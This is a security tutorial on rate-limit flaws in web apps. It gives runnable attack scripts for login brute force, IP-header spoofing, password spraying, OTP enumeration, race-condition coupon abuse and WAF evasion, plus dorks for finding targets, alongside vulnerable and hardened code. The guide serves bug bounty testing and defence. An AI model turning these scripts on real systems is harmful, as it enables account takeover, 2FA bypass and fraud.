---
title: "Rate Limit Vulnerability: The Complete Guide"
description: "Rate Limiting vulnerabilities are among the most impactful yet overlooked flaws in web applications. This guide provides complete coverage of all rate limit bypass techniques, from basic IP rotation to advanced race conditions. Whether you're a bug bounty hunter looking for your next critical finding or a developer hardening your APIs, this guide has everything you need."
categoryLabel: Web Security
published: 2026-03-27
updated: 2026-03-27
tags: [rate-limit, web-security, bug-bounty, owasp, api-security]
authors:
  - name: Bhagirath Saxena
    initials: BS
    social: "@rix4uni"
---


## What is Rate Limiting?

Rate limiting is a security mechanism that controls how many requests a user, IP, or session can make to a server within a defined time window. When rate limiting is absent, misconfigured, or bypassable, attackers can abuse endpoints to brute force credentials, enumerate users, bypass OTP codes, spam actions, and overwhelm services.

### Why Rate Limit Vulnerabilities Are Dangerous

- **Account Takeover**: Brute force login passwords or OTP codes without being blocked
- **User Enumeration**: Determine which emails/usernames are registered
- **Business Logic Abuse**: Mass-create accounts, place unlimited discount codes, or spam votes
- **Data Scraping**: Extract entire databases via unthrottled API calls
- **DoS / Resource Exhaustion**: Crash or degrade service by flooding endpoints
- **2FA Bypass**: Enumerate 6-digit OTP codes (only 1,000,000 combinations)
- **Financial Fraud**: Abuse referral codes, promo codes, or coupon systems at scale

---

## Missing Rate Limiting

### What is Missing Rate Limiting?

Missing rate limiting occurs when an application places no restriction on how many times a request can be made to a sensitive endpoint. This is the most straightforward variant — no limit exists at all.

### How It Works

1. Attacker identifies a sensitive endpoint (login, OTP, password reset, etc.)
2. Sends unlimited automated requests with no throttling
3. Server processes every request without blocking
4. Attacker achieves their goal (valid credentials, OTP, enumerated accounts)

### Vulnerable Code Example

```python:vulnerable

# Flask login — no rate limiting at all
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    user = db.query("SELECT * FROM users WHERE username = ?", username)
    if user and check_password(user.password_hash, password):
        session['user_id'] = user.id
        return redirect('/dashboard')
    return "Invalid credentials", 401
```

**Exploitation:**
```bash

# Brute force with ffuf
ffuf -w passwords.txt -X POST -d "username=admin&password=FUZZ" \
     -u https://example.com/login \
     -fc 401

# Or with hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com \
      http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

### Common Targets for Missing Rate Limits

| Endpoint | Attack | Impact |
|----------|--------|--------|
| `/login` | Password brute force | Account takeover |
| `/api/otp/verify` | OTP enumeration | 2FA bypass |
| `/forgot-password` | Email bombing | DoS on user inbox |
| `/register` | Mass account creation | Spam / resource abuse |
| `/api/coupon/apply` | Coupon enumeration | Financial fraud |
| `/api/search` | Data scraping | Data theft |
| `/api/vote` | Vote stuffing | Business logic abuse |

### Secure Code Example

```python:secure

from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app, key_func=get_remote_address)

# Allow only 5 login attempts per minute per IP
@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    username = request.form['username']
    password = request.form['password']

    user = db.query("SELECT * FROM users WHERE username = ?", username)
    if user and check_password(user.password_hash, password):
        session['user_id'] = user.id
        return redirect('/dashboard')
    return "Invalid credentials", 401
```

---

## IP-Based Rate Limit Bypass

### What is IP-Based Rate Limit Bypass?

Many applications implement rate limiting solely based on the client's IP address. When this is the case, attackers can spoof or rotate IP addresses using HTTP headers that the server trusts, effectively resetting their rate limit with every request.

### How It Works

1. Attacker sends requests until rate limit triggers (e.g., blocked after 5 attempts)
2. Attacker adds a spoofed IP header to the next request
3. Server reads the header as the "real" client IP and grants a fresh quota
4. Attacker repeats indefinitely

### IP Spoofing Headers

```http

# These headers are trusted by many frameworks/proxies
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Remote-Addr: 1.2.3.4
X-Client-IP: 1.2.3.4
CF-Connecting-IP: 1.2.3.4
True-Client-IP: 1.2.3.4
Forwarded: for=1.2.3.4
```

### Vulnerable Code Example

```python:vulnerable

import ipaddress
from flask import request

def get_client_ip():
    # VULNERABLE: Trusting user-controlled headers
    return (
        request.headers.get('X-Forwarded-For', '').split(',')[0].strip()
        or request.headers.get('X-Real-IP')
        or request.remote_addr
    )

@app.route('/login', methods=['POST'])
def login():
    ip = get_client_ip()
    if is_rate_limited(ip):
        return "Too many requests", 429
    # ... rest of login logic
```

### Exploitation

```python

import requests
import random

url = "https://example.com/login"

for i in range(1000):
    # Rotate fake IPs on every request
    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    
    headers = {
        "X-Forwarded-For": fake_ip,
        "X-Real-IP": fake_ip,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    data = {"username": "admin", "password": f"password{i}"}
    r = requests.post(url, data=data, headers=headers)
    
    if r.status_code == 200:
        print(f"[+] Valid password found: password{i}")
        break
```

### Bypass Techniques

#### 1. Rotating X-Forwarded-For

```bash

# Burp Suite Intruder — add X-Forwarded-For to position
# Use number list 1-255 to rotate last octet
GET /login HTTP/1.1
Host: example.com
X-Forwarded-For: 192.168.1.§1§
```

#### 2. IPv6 Rotation

```bash

# If application checks IPv4 only, switch to IPv6
X-Forwarded-For: ::ffff:1.2.3.4
X-Forwarded-For: 2001:db8::§1§
```

#### 3. Localhost / Internal IP Bypass

```http

# Some servers whitelist internal ranges entirely
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 10.0.0.1
X-Forwarded-For: 192.168.0.1
X-Forwarded-For: 172.16.0.1
```

### Secure Code Example

```python:secure

import ipaddress
from flask import request

TRUSTED_PROXIES = ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16']

def is_trusted_proxy(ip):
    """Check if request comes from a trusted proxy"""
    try:
        addr = ipaddress.ip_address(ip)
        return any(addr in ipaddress.ip_network(net) for net in TRUSTED_PROXIES)
    except ValueError:
        return False

def get_client_ip():
    """Safely determine the real client IP"""
    remote_addr = request.remote_addr
    
    # Only trust forwarded headers if the direct connection is a trusted proxy
    if is_trusted_proxy(remote_addr):
        forwarded_for = request.headers.get('X-Forwarded-For', '')
        if forwarded_for:
            # Take the leftmost (original client) IP
            return forwarded_for.split(',')[0].strip()
    
    # Otherwise, use the direct connection IP — not the header
    return remote_addr
```

---

## Account-Based Rate Limit Bypass

### What is Account-Based Rate Limit Bypass?

Some applications rate-limit by IP but not by account (or vice versa). By targeting many different accounts from the same IP, or accessing the same account from many IPs, attackers can bypass limits entirely. This technique is sometimes called **credential stuffing at scale**.

### How It Works

1. Application rate-limits 5 login attempts **per account** in 15 minutes
2. Attacker uses a list of 10,000 accounts
3. Sends only 1–2 attempts per account — never triggering the lock
4. Cycles through all accounts with common passwords ("Password1", "Summer2024!")
5. This is a **password spray** attack

### Vulnerable Scenario

```http

POST /api/login HTTP/1.1
Host: example.com

{"email":"victim1@gmail.com","password":"Password1"}   → 401
{"email":"victim2@gmail.com","password":"Password1"}   → 401
{"email":"victim3@gmail.com","password":"Password1"}   → 401
...
{"email":"victim999@gmail.com","password":"Password1"} → 200 ✓ HIT
```

### Exploitation — Password Spray Script

```python

import requests
import time

# Large list of target accounts
accounts = open("accounts.txt").read().splitlines()

# Short list of common passwords to spray
passwords = ["Password1", "Welcome1", "Summer2024!", "Company123"]

url = "https://example.com/api/login"

for password in passwords:
    print(f"[*] Spraying password: {password}")
    for email in accounts:
        r = requests.post(url, json={"email": email, "password": password})
        if r.status_code == 200:
            print(f"[+] HIT: {email} : {password}")
        time.sleep(0.5)  # Stay slow to avoid IP rate limits
    
    # Wait between password rounds to avoid lockout
    time.sleep(60)
```

### Secure Code Example

```python:secure

from datetime import datetime, timedelta

def check_rate_limit(ip: str, account: str) -> bool:
    """
    Rate limit on BOTH IP and account to prevent spray and brute force.
    Returns True if request should be blocked.
    """
    now = datetime.utcnow()
    window = timedelta(minutes=15)

    # Block if IP has > 20 failed attempts in 15 minutes (any account)
    ip_failures = db.count_failures(ip=ip, since=now - window)
    if ip_failures >= 20:
        return True

    # Block if account has > 5 failed attempts in 15 minutes (any IP)
    account_failures = db.count_failures(account=account, since=now - window)
    if account_failures >= 5:
        return True

    return False
```

---

## OTP / 2FA Rate Limit Bypass

### What is OTP Rate Limit Bypass?

One-Time Passwords (OTP) are typically 4–6 digit numeric codes, meaning there are only 10,000 to 1,000,000 possible values. Without rate limiting, an attacker can enumerate all possible OTPs and bypass two-factor authentication entirely.

### How It Works

1. Attacker gains access to a victim's username and password
2. Application sends OTP to victim's phone/email
3. Attacker must guess the OTP before it expires
4. If no rate limit: attacker sends all 1,000,000 possible values automatically
5. One request will match — 2FA bypassed

### Attack Feasibility

| OTP Length | Combinations | Requests at 100/sec | Time to Exhaust |
|------------|-------------|---------------------|-----------------|
| 4 digits | 10,000 | 100/sec | ~1.7 minutes |
| 6 digits | 1,000,000 | 100/sec | ~2.8 hours |
| 6 digits | 1,000,000 | 1000/sec | ~17 minutes |

### Vulnerable Code Example

```javascript:vulnerable

// No rate limit on OTP verification
app.post('/api/verify-otp', async (req, res) => {
    const { userId, otp } = req.body;

    const record = await db.query(
        'SELECT * FROM otp_tokens WHERE user_id = ? AND token = ? AND expires_at > NOW()',
        [userId, otp]
    );

    if (record.length > 0) {
        await db.query('DELETE FROM otp_tokens WHERE user_id = ?', [userId]);
        req.session.verified = true;
        res.json({ success: true });
    } else {
        res.status(401).json({ error: 'Invalid OTP' });
    }
});
```

### Exploitation

```python

import requests
import threading

url = "https://example.com/api/verify-otp"
user_id = "12345"
found = False

def try_otp(start, end):
    global found
    for code in range(start, end):
        if found:
            return
        otp = str(code).zfill(6)
        r = requests.post(url, json={"userId": user_id, "otp": otp})
        if r.status_code == 200:
            print(f"[+] Valid OTP found: {otp}")
            found = True
            return

# Use threads to enumerate faster
threads = []
chunk = 1000000 // 10
for i in range(10):
    t = threading.Thread(target=try_otp, args=(i * chunk, (i+1) * chunk))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

### Secure Code Example

```javascript:secure

const rateLimit = require('express-rate-limit');

// Strict limit: 5 attempts per 15 minutes per IP
const otpLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 5,
    message: { error: 'Too many OTP attempts. Try again later.' },
    standardHeaders: true
});

app.post('/api/verify-otp', otpLimiter, async (req, res) => {
    const { userId, otp } = req.body;

    // Also track per-user attempts (not just per IP)
    const userAttempts = await redis.incr(`otp_attempts:${userId}`);
    await redis.expire(`otp_attempts:${userId}`, 900); // 15 minutes TTL

    if (userAttempts > 5) {
        // Invalidate OTP on too many failures
        await db.query('DELETE FROM otp_tokens WHERE user_id = ?', [userId]);
        return res.status(429).json({ error: 'Too many attempts. OTP invalidated.' });
    }

    const record = await db.query(
        'SELECT * FROM otp_tokens WHERE user_id = ? AND token = ? AND expires_at > NOW()',
        [userId, otp]
    );

    if (record.length > 0) {
        await db.query('DELETE FROM otp_tokens WHERE user_id = ?', [userId]);
        await redis.del(`otp_attempts:${userId}`);
        req.session.verified = true;
        res.json({ success: true });
    } else {
        res.status(401).json({ error: 'Invalid OTP' });
    }
});
```

---

## Race Condition Rate Limit Bypass

### What is a Race Condition Bypass?

Race conditions occur when multiple requests are processed simultaneously before the server has time to update state (e.g., increment a counter, mark a token as used, or deduct a balance). By sending requests in parallel, attackers can execute an action multiple times within a single rate-limit window.

### How It Works

1. Application allows 1 coupon redemption per account
2. Attacker sends 50 redemption requests **simultaneously** (within milliseconds)
3. All 50 requests arrive before the first has been processed
4. Database hasn't marked the coupon as "used" yet when #2–50 are checked
5. All 50 succeed — coupon is redeemed 50 times

### Common Race Condition Targets

- Coupon/discount code redemption
- Gift card balance checking
- API credits (free tier limits)
- Referral bonus systems
- Vote / like systems
- File upload limits
- Transaction processing

### Exploitation with Burp Suite Turbo Intruder

```python

# Turbo Intruder script for race condition testing
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,  # High concurrency
                          requestsPerConnection=1,
                          pipeline=False)

    # Send 50 identical requests at once
    for i in range(50):
        engine.queue(target.req, gate='race1')

    # Fire all requests simultaneously
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Exploitation with Python (asyncio)

```python

import asyncio
import aiohttp

URL = "https://example.com/api/redeem-coupon"
HEADERS = {"Authorization": "Bearer YOUR_TOKEN", "Content-Type": "application/json"}
PAYLOAD = {"coupon_code": "SAVE50"}

async def redeem(session, i):
    async with session.post(URL, json=PAYLOAD, headers=HEADERS) as r:
        text = await r.text()
        print(f"[Request {i}] Status: {r.status} | Response: {text[:80]}")

async def main():
    async with aiohttp.ClientSession() as session:
        # Send 50 concurrent requests
        tasks = [redeem(session, i) for i in range(50)]
        await asyncio.gather(*tasks)

asyncio.run(main())
```

### Vulnerable Code Example

```javascript:vulnerable

// Vulnerable coupon redemption — classic TOCTOU race condition
app.post('/api/redeem', async (req, res) => {
    const { couponCode } = req.body;
    const userId = req.user.id;

    // CHECK: Is coupon valid and unused?
    const coupon = await db.query(
        'SELECT * FROM coupons WHERE code = ? AND used = false', [couponCode]
    );

    if (!coupon) return res.status(400).json({ error: 'Invalid coupon' });

    // TIME WINDOW: Between CHECK and USE, multiple requests can slip through

    // USE: Mark as used and apply discount
    await db.query('UPDATE coupons SET used = true WHERE code = ?', [couponCode]);
    await db.query('INSERT INTO user_credits (user_id, amount) VALUES (?, ?)', [userId, coupon.value]);
    
    res.json({ success: true, credited: coupon.value });
});
```

### Secure Code Example

```javascript:secure

// Secure using database-level atomic update (eliminates race window)
app.post('/api/redeem', async (req, res) => {
    const { couponCode } = req.body;
    const userId = req.user.id;

    // ATOMIC: Update returns 0 rows if coupon already used
    // The WHERE clause and UPDATE happen in a single atomic DB operation
    const result = await db.query(
        'UPDATE coupons SET used = true, used_by = ?, used_at = NOW() WHERE code = ? AND used = false',
        [userId, couponCode]
    );

    // If 0 rows affected, coupon was already used (or doesn't exist)
    if (result.affectedRows === 0) {
        return res.status(400).json({ error: 'Coupon invalid or already used' });
    }

    const coupon = await db.query('SELECT value FROM coupons WHERE code = ?', [couponCode]);
    await db.query('INSERT INTO user_credits (user_id, amount) VALUES (?, ?)', [userId, coupon[0].value]);

    res.json({ success: true, credited: coupon[0].value });
});
```

---

## Request Manipulation Bypass

### What is Request Manipulation Bypass?

Some rate-limit implementations are tied to specific parameters of the request (URL path, Content-Type, parameter casing, etc.) rather than the logical action being performed. By slightly altering the request structure, attackers can trick the server into treating each request as unique, resetting their counter.

### Bypass Techniques

#### 1. URL Variations

```http

# Original — gets rate limited after 5 attempts
POST /api/login

# Variations that may bypass
POST /api/login/
POST /API/login
POST /api/LOGIN
POST /api/./login
POST /api/login%20
POST /api/login?
POST /api/login#
POST /api/v1/../login
```

#### 2. Parameter Case / Order Variation

```http

# Standard
POST /login
username=admin&password=test

# Variations
POST /login
Username=admin&password=test

POST /login
USERNAME=admin&PASSWORD=test

POST /login
password=test&username=admin
```

#### 3. Content-Type Switching

```http

# Standard JSON
POST /api/login
Content-Type: application/json
{"username":"admin","password":"test"}

# Switch to form-encoded
POST /api/login
Content-Type: application/x-www-form-urlencoded
username=admin&password=test

# Try multipart
POST /api/login
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
------WebKitFormBoundary
Content-Disposition: form-data; name="username"
admin
```

#### 4. Null Byte / Special Character Injection

```http

POST /api/login
{"username":"admin\u0000","password":"test"}

POST /api/login
{"username":"admin ","password":"test"}

POST /api/login
{"username":"ADMIN","password":"test"}
```

#### 5. Adding Junk Parameters

```http

POST /api/login
username=admin&password=test&_=1
username=admin&password=test&_=2
username=admin&password=test&_=3
username=admin&password=test&cache_buster=randomvalue
```

---

## Response-Based Detection

### Identifying Rate Limit Behaviour

Before attempting bypasses, understand what the server's rate limit looks like. Different responses indicate different implementations.

| Response | Meaning | Notes |
|----------|---------|-------|
| `429 Too Many Requests` | Standard rate limit | Check `Retry-After` header |
| `403 Forbidden` | IP-based block | May be WAF or firewall |
| `200 OK` with error body | Soft rate limit | Application-level, not HTTP |
| `503 Service Unavailable` | Server-side throttle | Infrastructure-level |
| Increasing response time | Token bucket slowdown | Leaky bucket algorithm |
| CAPTCHA trigger | Behavior-based detection | Check if bypassable |

### Detecting Soft vs Hard Limits

```python

import requests
import time

url = "https://example.com/api/login"
data = {"username": "test@test.com", "password": "wrongpassword"}

for i in range(20):
    start = time.time()
    r = requests.post(url, json=data)
    elapsed = time.time() - start

    print(f"[{i+1:02d}] Status: {r.status_code} | Time: {elapsed:.2f}s | "
          f"Body: {r.text[:60]}")
    time.sleep(0.1)
```

---

## CAPTCHA Bypass Techniques

### When CAPTCHA is the Rate Limit

Some applications use CAPTCHA instead of (or alongside) request counting. CAPTCHA can sometimes be bypassed.

#### 1. Old Token Reuse

```http

# CAPTCHA tokens are sometimes valid for multiple requests
POST /api/login
g-recaptcha-response=03AGdBq24...VALID_TOKEN_FROM_FIRST_REQUEST
```

#### 2. Missing CAPTCHA Validation on API

```http

# Web form has CAPTCHA — but mobile/API endpoint does not
POST /api/v1/login         ← No CAPTCHA check
POST /mobile/login         ← No CAPTCHA check
POST /legacy/authenticate  ← No CAPTCHA check
```

#### 3. Subdomain Differences

```bash

# CAPTCHA enforced on main domain
https://www.example.com/login  → CAPTCHA required

# But not on:
https://api.example.com/login  → No CAPTCHA
https://m.example.com/login    → No CAPTCHA
https://app.example.com/login  → No CAPTCHA
```

---

## Bug Bounty Hunter's Guide

### Where to Find Rate Limit Vulnerabilities

#### 1. Authentication Flows

- Login endpoints (`/login`, `/api/auth`, `/signin`)
- Password reset (`/forgot-password`, `/reset-password`)
- OTP / 2FA verification (`/verify`, `/api/otp/check`)
- Security question answers
- PIN / passcode entry (mobile apps)

#### 2. Account Enumeration

```bash

# Test if error messages differ between existing and non-existing accounts
POST /api/login {"email":"real@example.com"}    → "Wrong password"
POST /api/login {"email":"fake@example.com"}    → "Account not found"

# If messages differ → enumeration possible + rate limit needed
```

#### 3. Business Logic Endpoints

- Coupon / promo code redemption
- Referral code submission
- Vote, like, or reaction systems
- Report / flag actions
- Payment retry attempts
- API credits and quota systems

#### 4. Google Dorks to Find Targets (Bug Bounty Only)

```

# Find login pages
inurl:/api/login intitle:"login"
inurl:/api/v1/auth
inurl:/api/otp/verify
inurl:/api/2fa/verify

# Bug bounty scopes with rate limits in scope
site:hackerone.com "rate limit" "in scope"
site:bugcrowd.com "brute force" "rate limiting"
site:intigriti.com "rate limit"

# Find password reset endpoints
inurl:/reset-password site:*.io
inurl:/forgot-password site:*.com

# API documentation exposing endpoints
inurl:/api/docs intitle:"API Reference"
inurl:/swagger-ui inurl:login
```

### Testing Methodology

#### Step 1: Map All Authentication Endpoints

```bash

# Use gau + grep to find auth-related endpoints
gau target.com | grep -iE "(login|auth|otp|verify|reset|password|signin|2fa|mfa)"

# Or use ffuf for endpoint discovery
ffuf -w /usr/share/wordlists/api-endpoints.txt \
     -u https://target.com/FUZZ \
     -mc 200,301,302,401,403
```

#### Step 2: Baseline the Rate Limit

```bash

# Send 10–20 identical requests and observe when/if blocking occurs
for i in $(seq 1 20); do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST https://target.com/login \
        -d "username=admin&password=wrong")
    echo "Request $i: $STATUS"
done
```

#### Step 3: Attempt IP Header Bypass

```python

import requests

url = "https://target.com/login"
data = {"username": "admin", "password": "test"}

for i in range(100):
    headers = {"X-Forwarded-For": f"10.0.{i // 256}.{i % 256}"}
    r = requests.post(url, data=data, headers=headers)
    print(f"[{i}] {r.status_code} — XFF: {headers['X-Forwarded-For']}")
```

#### Step 4: Test Race Conditions

```bash

# Using Burp Suite Turbo Intruder with "gate" mode
# Send 30–50 identical requests simultaneously
# Observe if any succeed that shouldn't

# Or using curl with & for parallelism
for i in $(seq 1 20); do
    curl -s -X POST https://target.com/api/redeem \
        -H "Authorization: Bearer $TOKEN" \
        -d '{"coupon":"TEST50"}' & 
done
wait
```

#### Step 5: Document and Report

For a strong bug bounty report, include:

- **Endpoint tested**: Full URL and HTTP method
- **Steps to reproduce**: Numbered, exact steps
- **Proof of concept**: Working script or Burp replay file
- **Impact**: What can be achieved (account takeover, 2FA bypass, etc.)
- **CVSS score suggestion**: Rate your finding
- **Suggested fix**: Show the remediation

### Sample Bug Bounty Report Template

```markdown

**Title**: Missing Rate Limit on OTP Verification Allows 2FA Bypass

**Severity**: High

**Endpoint**: POST /api/verify-otp

**Steps to Reproduce**:
1. Log in with valid credentials. 2FA is triggered.
2. Intercept the POST /api/verify-otp request in Burp Suite.
3. Send to Intruder. Set `otp` parameter as the fuzz position.
4. Use a number payload from 000000 to 999999.
5. Launch attack at maximum threads.
6. Observe: no 429 is returned. All requests processed.
7. A 200 response with valid session token is returned for the correct OTP.

**Impact**: Complete bypass of two-factor authentication. Any account with known
credentials can be taken over within minutes.

**PoC Script**: [attach script]

**Suggested Fix**: Limit OTP attempts to 5 per 15-minute window per user ID
AND per IP. Invalidate OTP after 5 failed attempts.
```

---

## WAF / Protection Bypass Techniques

### Bypassing Cloudflare and AWS WAF Rate Limits

```http

# Cloudflare sometimes allows different treatment per path variation
POST /login
POST /Login
POST /login/
POST /login?source=web

# Add headers to appear as legitimate traffic
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Referer: https://example.com/login-page
```

### Slowloris-Style Low-and-Slow Bypass

```python

import requests
import time
import random

# Stay well under rate limit threshold, use random delays
url = "https://example.com/api/login"
passwords = open("wordlist.txt").read().splitlines()

for password in passwords:
    r = requests.post(url, data={"username": "admin", "password": password})
    if r.status_code == 200:
        print(f"[+] Found: {password}")
        break
    # Random delay between 2-5 seconds — avoids pattern detection
    time.sleep(random.uniform(2, 5))
```

---

## Developer's Defense Guide

### Defense-in-Depth Strategy

#### Layer 1: Rate Limit on Multiple Dimensions

```python

from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

def get_user_key():
    """Rate limit by user ID if authenticated, else by IP"""
    if hasattr(request, 'user') and request.user:
        return f"user:{request.user.id}"
    return f"ip:{get_remote_address()}"

limiter = Limiter(app, key_func=get_user_key)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")          # Per-user/IP: 5/min
@limiter.limit("20 per hour")           # Longer window: 20/hour
@limiter.limit("100 per day")           # Daily cap: 100/day
def login():
    ...
```

#### Layer 2: Progressive Delays (Tarpitting)

```javascript

// Exponential backoff on failures — makes brute force impractical
async function loginWithDelay(username, password, failCount) {
    if (failCount > 0) {
        // Delay increases exponentially: 1s, 2s, 4s, 8s, 16s...
        const delay = Math.min(Math.pow(2, failCount) * 1000, 30000);
        await new Promise(resolve => setTimeout(resolve, delay));
    }
    // ... perform login
}
```

#### Layer 3: Account Lockout with Notification

```python

MAX_ATTEMPTS = 10
LOCKOUT_DURATION = 30  # minutes

def check_account_lockout(username: str) -> bool:
    key = f"lockout:{username}"
    attempts = redis.get(key)
    
    if attempts and int(attempts) >= MAX_ATTEMPTS:
        # Notify the real user via email
        send_security_alert_email(username, "Multiple failed login attempts detected")
        return True  # Account is locked
    return False

def record_failed_attempt(username: str):
    key = f"lockout:{username}"
    pipe = redis.pipeline()
    pipe.incr(key)
    pipe.expire(key, LOCKOUT_DURATION * 60)
    pipe.execute()
```

#### Layer 4: CAPTCHA on Suspicious Activity

```javascript

// Only show CAPTCHA after threshold — not on every request
async function shouldRequireCaptcha(identifier) {
    const attempts = await redis.get(`attempts:${identifier}`) || 0;
    return parseInt(attempts) >= 3; // CAPTCHA after 3 fails
}

app.post('/login', async (req, res) => {
    const { username, password, captchaToken } = req.body;
    
    if (await shouldRequireCaptcha(username)) {
        const valid = await verifyCaptcha(captchaToken);
        if (!valid) return res.status(400).json({ error: 'CAPTCHA required' });
    }
    // ... login logic
});
```

#### Layer 5: Distributed Rate Limit with Redis

```python

import redis
import time

r = redis.Redis(host='localhost', port=6379)

def sliding_window_rate_limit(key: str, limit: int, window: int) -> bool:
    """
    Sliding window rate limiter using Redis sorted sets.
    Returns True if request should be blocked.
    """
    now = time.time()
    window_start = now - window

    pipe = r.pipeline()
    # Remove old entries outside the window
    pipe.zremrangebyscore(key, 0, window_start)
    # Count current requests in window
    pipe.zcard(key)
    # Add current request
    pipe.zadd(key, {str(now): now})
    # Set expiry
    pipe.expire(key, window)
    results = pipe.execute()

    current_count = results[1]
    return current_count >= limit

# Usage
@app.route('/login', methods=['POST'])
def login():
    ip = request.remote_addr
    user = request.form.get('username')
    
    # Block if either IP or account exceeds limit
    if (sliding_window_rate_limit(f"ip:{ip}", 20, 60) or
        sliding_window_rate_limit(f"user:{user}", 5, 60)):
        return jsonify({"error": "Too many requests"}), 429
```

### Rate Limit Response Headers (Best Practice)

```http

HTTP/1.1 200 OK
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 97
X-RateLimit-Reset: 1711584000
Retry-After: 60
```

```python:secure

from flask import after_request

@after_request
def add_rate_limit_headers(response):
    limit_info = get_current_limit_info()
    response.headers['X-RateLimit-Limit'] = limit_info['limit']
    response.headers['X-RateLimit-Remaining'] = limit_info['remaining']
    response.headers['X-RateLimit-Reset'] = limit_info['reset_timestamp']
    return response
```

---

## Tools & Resources

### Detection & Testing Tools

| Tool | Purpose | URL |
|------|---------|-----|
| Burp Suite (Intruder) | Manual rate limit testing | https://portswigger.net/burp |
| Turbo Intruder | Race condition testing | https://github.com/PortSwigger/turbo-intruder |
| ffuf | Endpoint fuzzing | https://github.com/ffuf/ffuf |
| Hydra | Login brute forcing | https://github.com/vanhauser-thc/thc-hydra |
| nuclei | Template-based rate limit detection | https://github.com/projectdiscovery/nuclei |
| RateLimitCLI | Dedicated rate limit tester | https://github.com/altinukshini/RateLimitCLI |

### Useful nuclei Templates

```bash

# Run nuclei rate limit templates against a target
nuclei -u https://example.com \
       -t nuclei-templates/vulnerabilities/generic/missing-rate-limit.yaml \
       -t nuclei-templates/vulnerabilities/generic/otp-miss-ratelimit.yaml
```

### Automation Script — Full Rate Limit Tester

```python

#!/usr/bin/env python3
"""
Rate Limit Tester - Educational use / authorized targets only
"""
import requests
import time
import random

class RateLimitTester:
    def __init__(self, url, method="POST", data=None, headers=None):
        self.url = url
        self.method = method
        self.data = data or {}
        self.headers = headers or {}
        self.results = []

    def test_basic(self, count=20):
        """Test if basic rate limit exists"""
        print(f"[*] Testing basic rate limit ({count} requests)...")
        for i in range(count):
            r = requests.request(self.method, self.url,
                                 data=self.data, headers=self.headers)
            self.results.append(r.status_code)
            print(f"  [{i+1:02d}] {r.status_code}")
            time.sleep(0.1)

    def test_ip_bypass(self, count=20):
        """Test X-Forwarded-For bypass"""
        print(f"[*] Testing IP header bypass...")
        bypass_headers = [
            "X-Forwarded-For", "X-Real-IP", "X-Client-IP",
            "CF-Connecting-IP", "True-Client-IP"
        ]
        for i in range(count):
            fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.1.1"
            h = {**self.headers, random.choice(bypass_headers): fake_ip}
            r = requests.request(self.method, self.url, data=self.data, headers=h)
            print(f"  [{i+1:02d}] {r.status_code} — IP: {fake_ip}")
            time.sleep(0.05)

    def report(self):
        blocked = self.results.count(429) + self.results.count(403)
        print(f"\n[*] Results: {len(self.results)} requests, {blocked} blocked")
        if blocked == 0:
            print("[!] VULNERABLE: No rate limit detected")
        elif blocked < len(self.results) // 2:
            print("[!] POSSIBLY VULNERABLE: Inconsistent rate limiting")
        else:
            print("[+] Rate limit appears to be in place")


if __name__ == "__main__":
    tester = RateLimitTester(
        url="https://example.com/login",
        data={"username": "admin", "password": "test"}
    )
    tester.test_basic(20)
    tester.test_ip_bypass(20)
    tester.report()
```

### Learning Resources

- **OWASP Testing Guide — Brute Force**: https://owasp.org/www-project-web-security-testing-guide/
- **PortSwigger Race Conditions Lab**: https://portswigger.net/web-security/race-conditions
- **HackTricks Rate Limit Bypass**: https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass
- **OWASP API Security Top 10**: https://owasp.org/www-project-api-security/

### Practice Labs

- **PortSwigger Web Academy**: Brute force and race condition labs
- **DVWA**: Brute force module with configurable security levels
- **HackTheBox**: API and authentication challenges
- **TryHackMe**: "Burp Suite" and "Authentication Bypass" rooms
- **PentesterLab**: API security exercises

---

## Conclusion

Rate limit vulnerabilities are deceptively simple yet critically impactful. A single missing rate limit on an OTP endpoint can lead to complete account takeover; a race condition on a coupon endpoint can result in significant financial loss.

Key takeaways:

1. **For Bug Bounty Hunters**: Test every authentication and business-logic endpoint. Don't just check if a limit exists — check if it can be bypassed via IP headers, parameter manipulation, or race conditions. OTP and 2FA bypasses are high-severity findings that are often overlooked.

2. **For Developers**: Rate limit on multiple dimensions simultaneously (IP, user ID, device fingerprint). Use atomic database operations for anything that should happen only once. Never trust client-supplied IP headers from untrusted sources. Implement progressive delays and account lockout notifications.

3. **For Everyone**: Rate limiting is a foundational security control. Its absence or misconfiguration can undermine even the strongest authentication system. Treat it as seriously as SQL injection or XSS.

---

*This guide is a living document. New bypass techniques and defensive patterns emerge constantly. Stay updated, practice on labs, and help make the web more secure.*

**Found this guide helpful?** Share it with your team and contribute your knowledge back to the community. If you find bugs using techniques from this guide, consider responsible disclosure.

---

*Published by KrazePlanet Security Research. For educational purposes only.*
